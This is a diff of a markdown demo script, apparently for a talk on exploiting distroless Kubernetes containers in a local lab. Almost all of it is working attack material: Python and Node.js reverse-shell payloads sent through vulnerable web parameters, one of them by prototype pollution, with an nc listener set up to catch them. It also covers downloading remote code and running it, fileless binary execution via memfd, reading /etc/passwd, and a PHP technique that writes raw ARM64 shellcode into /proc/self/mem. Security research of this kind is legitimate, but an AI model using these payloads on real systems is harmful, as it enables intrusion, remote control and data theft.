@@ -1,3 +1,11 @@
+# pre
+Start docker & minikube
+kubectl exec -it ubuntu -- bash; apt update; apt install net-tools netcat git wget python3 nano -y
+cd /tmp
+git clone https://github.com/nnsee/fileless-elf-exec
+cd fileless-elf-exec
+wget https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl
+
 # Demo 0: What is distroless
 ## No sh
 kubectl exec -it dless-express-pp-pod -- sh
@@ -15,7 +23,7 @@ command -v openssl #https://www.form3.tech/engineering/content/exploiting-distro
 
 
 # Demo 1: Python RCE
-kubectl port-forward dless-flask-ssti-pod 3002:8080
+kubectl port-forward dless-python-rce-pod 3001:8080
 
 ## No binaries
 http://localhost:3001/?cmd=ls
@@ -32,26 +40,37 @@ http://127.0.0.1:3001/?cmd=python -c "exec('import platform\nprint(platform.unam
 
 ## Get reverse shell
 
-http://127.0.0.1:3001/?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.4",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/usr/bin/python","-i"]);'
+### Prepare ubuntu
+kubectl exec -it ubuntu -- bash
+ifconfig
+nc -lvnp 4444
+
+### Rev shell
+http://127.0.0.1:3001/?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.3",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/usr/bin/python","-i"]);'
 
 ## Execute binary using syscall
-wget https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl
+cd /tmp/fileless-elf-exec
 python3 fee.py kubectl > /tmp/kubectl.py
 python3 /tmp/kubectl.py
 
 ### Fix code
-
 ```python
+# imports ...
 # imports ...
 pid = os.fork()
 if pid == 0: #pid==0 represents the child process
 # Rest of the payload inside this if
 ```
 
+### In a different shell in ubuntu
+kubectl exec -it ubuntu -- bash
+cd /tmp/fileless-elf-exec
+python3 -m http.server
+
 ### Download & execute ls.py in victim
 ```python
 from urllib import request
-kubectl = request.urlopen("http://172.17.0.4:8000/kubectl.py").read()
+kubectl = request.urlopen("http://172.17.0.3:8000/kubectl.py").read()
 exec(kubectl)
 ```
 
@@ -75,7 +94,7 @@ http://127.0.0.1:3002/?name={{(1).__class__.__base__.__subclasses__()[216]()._mo
 kubectl port-forward dless-express-pp-pod 3000:3000
 
 ## Reverse-shell
-http://127.0.0.1:3000/?exec=1&data={"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\"child_process\").fork(\"-e\",[\"net=require(`net`);cp=require(`child_process`);sh=cp.spawn(`/proc/self/exe`, [`-i`], {detached: true});client = new net.Socket();client.connect(4444, `172.17.0.4`, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});//\"],{\"env\":{\"NODE_OPTIONS\":\"\"}}).toString())//"}}}
+http://127.0.0.1:3000/?exec=1&data={"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\"child_process\").fork(\"-e\",[\"net=require(`net`);cp=require(`child_process`);sh=cp.spawn(`/proc/self/exe`, [`-i`], {detached: true});client = new net.Socket();client.connect(4444, `172.17.0.3`, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});//\"],{\"env\":{\"NODE_OPTIONS\":\"\"}}).toString())//"}}}
 
 ## Info
 ```js
@@ -170,6 +189,7 @@ function get_memfd_num(path){
     });
 }
 get_memfd_num(`/proc/${proc.pid}/fd`);
+memfd_file_path = "/proc/69/fd/20" // CHANGE THIS
 
 // Download the binary to execute in the fd
 var download = function(url, dest) {
@@ -184,10 +204,10 @@ var download = function(url, dest) {
 };
 
 // CHANGE THE FD: /proc/80/fd/20
-download("https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl", "/proc/80/fd/20")
+download("https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl", memfd_file_path)
 
 // Execute the fd directly from the exec syscall
-fork("", [], {"execPath": "/proc/80/fd/20", "execArgv": []})
+fork("", [], {"execPath": memfd_file_path, "execArgv": []})
 ```
 
 
@@ -218,7 +238,7 @@ listFilesInFolder("/");
 echo file_get_contents("/etc/passwd");
 ```
 
-## RCE
+## RCE 1
 
 ```php
 # Download binary to memory
@@ -229,6 +249,8 @@ while (!feof($handle)) {
     $binary .= fread($handle, 2048);
 }
 fclose($handle);
+
+# Create shellcode
 $bin_size = strlen($binary);
 $hex_size = pack('P', $bin_size);
 $hex_size_str = bin2hex($hex_size);
@@ -293,6 +315,8 @@ echo stream_get_contents($pipes_kubectl[1]);
 proc_close($process2);
 ```
 
+
+
 ```
 To compile shellcode:
 
@@ -349,4 +373,66 @@ _start:
         svc     #0 // kill
 
     filesz:
+```
+
+
+
+
+## RCE 2
+```php
+# Download binary to memory
+$bin_url = "URL CARGADOR";
+$handle = fopen($bin_url, "r");
+$binary = "";
+while (!feof($handle)) {
+    $binary .= fread($handle, 2048);
+}
+fclose($handle);
+
+# Create shellcode
+$bin_size = strlen($binary);
+$hex_size = pack('P', $bin_size);
+$hex_size_str = bin2hex($hex_size);
+
+$hexstr_shellcode = "802888d2a088a8f2e00f1ff8e0030091210001cae82280d2010000d4e40300aa26030010c60040f9e10306aac80580d2010000d4c81b80d2000080d2e10306aa620080d2230080d2050080d2010000d4e80780d2e10300aae20306aa000080d2010000d4420000eb2100008b81ffff54881580d2010000d4610280d2281080d2010000d4" . $hex_size_str;
+
+
+# Execute binary
+$cmd_array = [
+    'php',
+    '-a'
+];
+
+$descriptorspec = array(
+    0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
+    1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
+    2 => array("pipe", "w")    // stderr is a pipe that the child will write to
+);
+
+# The only wy in PHP to execute a binary without using a shell is using an array in proc_open
+$process = proc_open($cmd_array,$descriptorspec,$pipes);
+$status = proc_get_status($process);
+$pid = $status['pid'];
+
+# Execute shellcode in child process
+$payload = "\n".'$data = file_get_contents("/proc/self/syscall"); $data_array = explode(" ", $data); $mem_addr = trim($data_array[8]); $dec_offset = hexdec($mem_addr); $shellcode = hex2bin("'.$hexstr_shellcode.'"); $fd = fopen("/proc/self/mem", "r+"); fseek($fd,$dec_offset); fwrite($fd, $shellcode); fclose($fd);'."\n\n".$binary; # 2 new lines are needed
+
+fwrite($pipes[0], $payload);
+
+# Check it was created
+function listFilesInFolder($folderPath) {
+  if (is_dir($folderPath)) {
+    if ($dh = opendir($folderPath)) {
+      while (($file = readdir($dh)) !== false) {
+        echo "filename: $file : filetype: " . filetype($folderPath . $file) . "\n";
+      }
+      closedir($dh);
+    }
+  }
+}
+
+listFilesInFolder("/proc/$pid/fd/");
+
+
+# TODO... usar el cargador para cargar un busybox a ser posible o sino un kubectl o cualquier cosa
 ```
